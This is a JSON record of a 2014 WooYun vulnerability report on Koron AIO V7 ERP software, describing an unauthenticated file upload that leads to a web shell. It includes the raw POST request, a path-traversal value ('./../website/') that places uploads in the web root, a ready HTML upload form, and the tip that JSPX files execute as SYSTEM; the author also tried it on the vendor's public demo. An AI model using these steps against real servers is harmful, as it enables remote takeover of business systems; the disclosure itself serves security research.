{"id": 49509, "wybug_id": "wooyun-2014-073243", "wybug_title": "科荣AIO管理系统AIO V7存在前台GETSHELL漏洞", "wybug_corp": "科荣AIO管理系统", "wybug_author": "U神", "wybug_date": "2014-08-21 12:48", "wybug_open_date": "2014-11-19 12:50", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  厂商：\nhttp://www.krrj.cn/ 进销存软件-ERP库存管理-仓库管理软件-科荣软件官网\n案例就官网列出来的大概有300多个。\n\n测试的时候是本地搭建的，自动化完成的搭建环境。下载地址，还是2014-5-12日更新的\nhttp://www.krrj.cn/download/aiov7.exe\n此次测试主要是黑盒测试，没什么技术含量的。   漏洞证明：  科荣AIO V7管理系统下载后的程序实现一键自动化安装，默认安装是在：D:\\KoronSoft\\。目录下分别有AIO、DB两个文件夹，除DB是数据库外，AIO则是程序的主目录，但并不是WEB根目录，WEB的根目录是：D:\\KoronSoft\\AIO\\website。在后台的操作中抓取数据包发现一处任意文件上传的地方，然后通过delete cookie发现也可以一样地上传文件。如图：\n\n看看这个Post请求：\nPOST /UploadServlet?path=/temp/&fileType=AFFIX HTTP/1.1Host: localhost:8000Proxy-Connection: keep-aliveContent-Length: 433Origin: http://localhost:8000User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36Content-Type: multipart/form-data; boundary=----------cH2KM7cH2cH2ae0KM7GI3KM7ae0ae0Accept: */*Referer: Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ------------cH2KM7cH2cH2ae0KM7GI3KM7ae0ae0Content-Disposition: form-data; name=\"Filename\"test.jsp------------cH2KM7cH2cH2ae0KM7GI3KM7ae0ae0Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.jsp\"Content-Type: application/octet-streamthis is a test file------------cH2KM7cH2cH2ae0KM7GI3KM7ae0ae0Content-Disposition: form-data; name=\"Upload\"Submit Query------------cH2KM7cH2cH2ae0KM7GI3KM7ae0ae0--\n通过测试发现上传的文件在，“D:\\KoronSoft\\AIO\\fileServer_v7\\temp”，这个目录是专门存储上传后的文件的目录，根据上面我们说的“D:\\KoronSoft\\AIO\\”不是网站的根目录，“D:\\KoronSoft\\AIO\\fileServer_v7\\temp”也不是网站的根目录，网站的根目录是“D:\\KoronSoft\\AIO\\website”，只有该目录下的文件才可以够以http的形式访问，那么我们刚才上传的文件无法访问。\n\n而正好的是“path”这个参数是可控的，所以我们可以控制上传文件的目录来达到将上传的文件upload到网站根目录。这样只要构造path参数的值就可以啦，本地构造一个表单，将这个表单加入到本地的WEB环境中去测试。\n<form action=\"http://localhost:8000/UploadServlet?path=./../website/&fileType=AFFIX\" method=\"post\" enctype=\"multipart/form-data\" name=\"upload\"><input type=\"file\" name=\"newfile\"><input type=\"submit\" name=\"Submit\" value=\"upload\"></form>\n接着就是本地上传了，返回的是原来的文件名，上传后的文件名依然是以原文件名形式保存。\n\n接着发现我们只要控制了path参数，上传的shell也就到了网站根目录~\n\n\n\n#2.官网demo测试一下，使用本地WEB环境中的上传表单来测试。\nhttp://demo.koronsoft.com:8008/  demo地址\n更改表单中的post的地址上传。\n\n最后发现居然无法解析JSP的文件，但是通过测试发现可以解析JSPX的，于是本地测试一下上传JSPX的。看样子默认是system权限。jspx shell还是在http://blog.paxmac.org/?p=431 这里找到的\n\n官网我就不传jspx shell了，cncert可自行复现测试。   修复方案：  来点rank要升级了~   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}